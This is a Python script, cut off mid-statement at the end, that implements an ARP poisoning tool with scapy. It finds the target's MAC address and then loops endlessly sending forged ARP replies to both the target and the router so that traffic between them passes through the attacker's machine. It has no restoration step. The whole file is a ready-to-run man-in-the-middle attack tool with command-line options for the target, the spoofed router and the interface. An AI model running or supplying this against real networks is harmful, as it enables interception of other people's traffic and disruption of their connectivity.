from scapy.all import *
import argparse

class ArpSpoofer:
    def __init__(self, target_ip, arpspoof_ip, interface):
        self.target_ip = target_ip
        self.arpspoof_ip = arpspoof_ip
        self.interface = interface

    def findMacAddress(self, ip):
        request = ARP(pdst=ip)
        broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
        final_request = broadcast / request
        answer = srp(final_request, iface=self.interface, timeout=1, verbose=False)[0]
        mac = answer[0][1].hwsrc
        return mac

    def spoof(self, target, spoof_ip):
        mac = self.findMacAddress(target)
        packet = ARP(op=2, hwdst=mac, pdst=target, psrc=spoof_ip)
        send(packet, iface=self.interface, verbose=False)
        print(f"Spoofing {target} pretending to be {spoof_ip}")

    def run(self):
        print("ArpSpoofer active on: " + self.target_ip)
        while True:
            self.spoof(self.target_ip, self.arpspoof_ip)
            self.spoof(self.arpspoof_ip, self.target_ip)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARP poisoning tool")
    parser.add_argument("-t", "--target", required=True, help="IP of target")
    parser.add_argument("-s", "--spoof", required=True, help="IP of router you pretend to be")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to use")
    args = parser.parse_args()

    spoofer = ArpSpoofer(target_ip=args.target, arpspoof_ip=args.spoof,
